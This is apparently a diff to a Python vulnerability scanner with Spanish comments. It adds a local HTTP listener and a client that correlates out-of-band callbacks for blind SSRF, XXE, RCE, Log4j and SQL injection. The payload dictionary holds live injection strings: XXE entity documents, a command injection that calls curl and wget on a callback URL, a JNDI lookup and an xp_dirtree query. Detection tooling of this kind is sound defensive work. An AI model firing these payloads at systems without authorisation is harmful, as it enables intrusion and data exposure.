@@ -3,9 +3,12 @@
 Detecta vulnerabilidades ciegas de alto impacto (Blind SSRF, Blind XXE, Blind RCE, Log4j/JNDI)
 mediante la correlación de interacciones DNS y HTTP asíncronas.
 """
+import contextlib
 import logging
+import threading
 import time
 import uuid
+from http.server import BaseHTTPRequestHandler, HTTPServer
 from typing import Any, Optional
 from urllib.parse import parse_qs, urlencode, urlparse, urlunparse
 
@@ -16,16 +19,109 @@ from scanner.models import Evidence, Finding
 _logger = logging.getLogger("VulnScanner.OAST")
 
 
+class OASTHTTPHandler(BaseHTTPRequestHandler):
+    """Manejador HTTP mínimo para registrar llamadas entrantes OAST locales."""
+
+    def do_GET(self) -> None:
+        self._record_and_respond()
+
+    def do_POST(self) -> None:
+        self._record_and_respond()
+
+    def do_HEAD(self) -> None:
+        self._record_and_respond()
+
+    def _record_and_respond(self) -> None:
+        # Drenar cuerpo de la petición si está presente para evitar reset de conexión TCP en Windows
+        with contextlib.suppress(Exception):
+            length = int(self.headers.get("Content-Length", 0))
+            if length > 0:
+                self.rfile.read(length)
+
+        path = self.path
+        client_ip = self.client_address[0] if self.client_address else "127.0.0.1"
+        server_obj = getattr(self.server, "local_oast_server", None)
+        if server_obj and hasattr(server_obj, "record_interaction"):
+            server_obj.record_interaction(path=path, client_ip=client_ip, method=self.command)
+
+        self.send_response(200)
+        self.send_header("Content-Type", "text/plain")
+        self.send_header("X-OAST-Engine", "OmniBreach-Enterprise")
+        self.end_headers()
+        self.wfile.write(b"<!-- OAST Correlated -->")
+
+    def log_message(self, format: str, *args: Any) -> None:
+        pass
+
+
+class OASTLocalServer:
+    """Servidor HTTP de escucha local multihilo para correlación OAST sin internet."""
+
+    def __init__(self, host: str = "127.0.0.1", port: int = 0):
+        self.host = host
+        self.requested_port = port
+        self.httpd: Optional[HTTPServer] = None
+        self.thread: Optional[threading.Thread] = None
+        self.port: int = 0
+        self.interactions: list[dict[str, Any]] = []
+        self._lock = threading.Lock()
+
+    def start(self) -> int:
+        """Inicia el servidor en un hilo secundario daemon y retorna el puerto asignado."""
+        if self.httpd is not None:
+            return self.port
+
+        self.httpd = HTTPServer((self.host, self.requested_port), OASTHTTPHandler)
+        self.httpd.local_oast_server = self  # type: ignore[attr-defined]
+        self.port = int(self.httpd.server_address[1])
+
+        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
+        self.thread.start()
+        _logger.info("Servidor OAST local iniciado en %s:%d", self.host, self.port)
+        return self.port
+
+    def record_interaction(self, path: str, client_ip: str, method: str) -> None:
+        with self._lock:
+            self.interactions.append({
+                "type": "HTTP",
+                "path": path,
+                "client_ip": client_ip,
+                "method": method,
+                "timestamp": time.time(),
+            })
+
+    def get_interactions_for_token(self, token: str) -> list[dict[str, Any]]:
+        with self._lock:
+            return [
+                item for item in self.interactions
+                if token in str(item.get("path", ""))
+            ]
+
+    def stop(self) -> None:
+        if self.httpd:
+            self.httpd.shutdown()
+            self.httpd.server_close()
+            self.httpd = None
+            self.thread = None
+            _logger.info("Servidor OAST local detenido.")
+
+
 class OASTClient:
     """Cliente de correlación para pruebas Out-of-Band (OAST).
 
-    Soporta servidores de interacción públicos/privados (estilo Interactsh/Burp Collaborator)
-    y un modo simulado/mock local para pruebas de desarrollo sin conectividad externa.
+    Soporta servidores de interacción públicos/privados (estilo Interactsh/Burp Collaborator),
+    un servidor local embebido (OASTLocalServer) y un modo simulado/mock para pruebas.
     """
 
-    def __init__(self, server_domain: str = "oast.live", mock_mode: bool = False):
+    def __init__(
+        self,
+        server_domain: str = "oast.live",
+        mock_mode: bool = False,
+        local_server: Optional[OASTLocalServer] = None
+    ):
         self.server_domain = server_domain
         self.mock_mode = mock_mode
+        self.local_server = local_server
         self._registered_interactions: dict[str, list[dict[str, Any]]] = {}
         self._generated_tokens: set[str] = set()
 
@@ -39,10 +135,14 @@ class OASTClient:
 
     def get_callback_url(self, token: str) -> str:
         """Retorna una URL completa de callback vinculada al token."""
+        if self.local_server and self.local_server.port > 0:
+            return f"http://{self.local_server.host}:{self.local_server.port}/{token}"
         return f"http://{token}.{self.server_domain}"
 
     def get_callback_host(self, token: str) -> str:
         """Retorna el FQDN de callback para consultas DNS."""
+        if self.local_server and self.local_server.port > 0:
+            return f"{self.local_server.host}:{self.local_server.port}"
         return f"{token}.{self.server_domain}"
 
     def generate_payloads(self, token: str) -> dict[str, str]:
@@ -53,6 +153,7 @@ class OASTClient:
         return {
             "ssrf": cb_url,
             "xxe": f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "{cb_url}/xxe.dtd">%ext;]><root>&ext;</root>',
+            "xxe_param": f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "{cb_url}">%ext;]><root><test>1</test></root>',
             "rce": f'; curl {cb_url} || nslookup {cb_host} || wget {cb_url} &',
             "log4j": f'${{jndi:ldap://{cb_host}/a}}',
             "sqli_oob": f"'; exec master..xp_dirtree '//{cb_host}/oob'--",
@@ -70,6 +171,11 @@ class OASTClient:
 
     def poll_interactions(self, token: str, timeout: float = 2.0) -> list[dict[str, Any]]:
         """Consulta si el token recibió interacciones remotas (DNS o HTTP)."""
+        if self.local_server:
+            local_hits = self.local_server.get_interactions_for_token(token)
+            if local_hits:
+                return local_hits
+
         if self.mock_mode:
             return self._registered_interactions.get(token, [])
 
@@ -82,7 +188,6 @@ class OASTClient:
                 if isinstance(data, list):
                     return data
         except (requests.RequestException, ValueError):
-            # Si el servidor público no está disponible o la respuesta no es JSON, degradar limpiamente
             pass
 
         return self._registered_interactions.get(token, [])
